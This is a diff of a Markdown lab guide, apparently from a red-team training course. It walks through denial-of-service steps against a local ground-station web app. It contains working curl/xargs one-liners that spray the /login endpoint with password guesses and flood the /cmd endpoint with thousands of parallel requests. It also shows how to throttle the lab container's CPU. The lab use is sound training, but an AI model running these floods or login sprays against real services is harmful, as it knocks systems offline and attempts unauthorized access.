@@ -216,16 +216,18 @@ Watch the dashboard. You should see values freeze/loop, and operators will see *
 <hr>
 
 ## Part C - Lock Operators Out (Denial of Service)
-- Spam ``/login`` (weak, no rate limit)
+Let's spam ``/login`` (weak, no rate limit):
+
 ```bash
 seq 1 1000 | xargs -I{} -P 50 sh -c \
   'curl -s -X POST http://localhost:5000/login \
     -d user=admin -d pass=pwd{}'
 ```
 
-- Observe endless **“success”**
+Observe the endless **“success”** messages.
 
-- Flood ``/cmd`` (heavy CPU per call)
+Next, flood ``/cmd`` (heavy CPU per call):
+
 ```bash
 echo '{"mode":"CAL"}' > cmd.json
 ```
@@ -234,12 +236,14 @@ seq 1 20000 | xargs -I{} -P 400 sh -c \
  'curl -s -H "Content-Type: application/json" --data-binary @cmd.json http://localhost:5000/cmd >/dev/null'
 ```
 
-- Now while that is running try to run a normal command on another terminal
+While that is running try to run a normal command on another terminal:
+
 ```bash
 curl -s -H "Content-Type: application/json"   --data '{"mode":"SAFE"}' http://localhost:5000/cmd
 ```
 
-- There is no latency whatsoever because the server is keeping up, let's make it weaker
+Notice how there is no latency whatsoever because the server is keeping up.<br>
+Let's make it weaker.
 
 ```bash
 cd ~/Desktop/TheDenial/groundstation
@@ -249,28 +253,13 @@ cd ~/Desktop/TheDenial/groundstation
 sudo docker compose ps
 ```
 
-That name goes into the next command
+That name goes into the next command:
 
 ```bash
 sudo docker update --cpus 0.2 <the name here>
 ```
 
-- Now try the attack again and try a normal command, it should take a while before it goes through
-
-
-
-***                                                                 
-<b><i>Continuing the course? </br>[Next Lab](/Labs/redLabs/TheTakeover/TheTakeoverLab.md)</i></b>
-
-<b><i>Want to go back? </br>[Previous Lab](/Labs/redLabs/TheIntercepter/TheIntercepterLab.md)</i></b>
-
-<b><i>Looking for a different lab? </br>[Lab Directory](/navigation.md)</i></b>
-
-***Finished with the Labs?***
-
-Please be sure to destroy the lab environment!
-
-[Click here for instructions on how to destroy the Lab Environment](/labdestruction.md)
+Now try the attack again and try a normal command, it should take a while before it goes through
 
 ---
 
